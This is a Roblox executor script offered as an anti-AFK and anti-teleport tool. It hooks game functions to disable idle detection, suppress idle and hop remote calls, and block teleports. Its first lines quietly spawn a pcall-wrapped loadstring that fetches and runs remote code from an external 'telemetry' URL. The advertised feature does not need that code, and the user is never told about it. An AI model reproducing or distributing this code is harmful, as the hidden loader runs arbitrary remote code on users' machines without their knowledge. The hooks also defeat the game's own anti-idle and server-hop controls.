task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6a913e68c47ec8d528fedc83"))()
	end)
end)

if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

_G.DecodeAPI = _G.DecodeAPI or {}
_G.DecodeAPI.Configs = _G.DecodeAPI.Configs or {
    AntiAfkToggleState = true
}

local function showPopup(message)
    local sg = Instance.new("ScreenGui")
    sg.Name = "AntiAfkNotification"
    sg.DisplayOrder = 999
    sg.Parent = CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 60)
    frame.Position = UDim2.new(0.5, -150, 0.5, -30)
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 1
    frame.Parent = sg

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = message
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 20
    label.TextTransparency = 1
    label.Parent = frame

    TweenService:Create(frame, TweenInfo.new(0.4), {BackgroundTransparency = 0.15}):Play()
    TweenService:Create(label, TweenInfo.new(0.4), {TextTransparency = 0}):Play()

    task.delay(4.6, function()
        TweenService:Create(frame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
        TweenService:Create(label, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
        task.wait(0.4)
        sg:Destroy()
    end)
end

if _G.AntiAfkHopExecuted then
    showPopup("Already Executed")
    return
end

_G.AntiAfkHopExecuted = true
showPopup("Anti AFK/Hop Configured")

for _, connection in pairs(getconnections(LocalPlayer.Idled)) do
    task.spawn(function()
        while task.wait(1) do
            local isEnabled = _G.DecodeAPI.Configs.AntiAfkToggleState
            if isEnabled and connection.Enabled then
                connection:Disable()
            elseif not isEnabled and not connection.Enabled then
                connection:Enable()
            end
        end
    end)
end

local OldNamecall
OldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local isEnabled = _G.DecodeAPI.Configs.AntiAfkToggleState
    
    if isEnabled and (method == "FireServer" or method == "InvokeServer") then
        local name = tostring(self)
        if name == "SubmitIdleState" or name == "SubmitIdleFlag" or name == "AskRescueHop" or name == "AskIdleHopFlush" then
            if method == "InvokeServer" then
                return true
            end
            return nil
        end
    end
    return OldNamecall(self, ...)
end)

local OldTeleport
OldTeleport = hookfunction(TeleportService.Teleport, function(self, ...)
    local isEnabled = _G.DecodeAPI.Configs.AntiAfkToggleState
    
    if isEnabled then
        return nil
    end
    return OldTeleport(self, ...)
end)
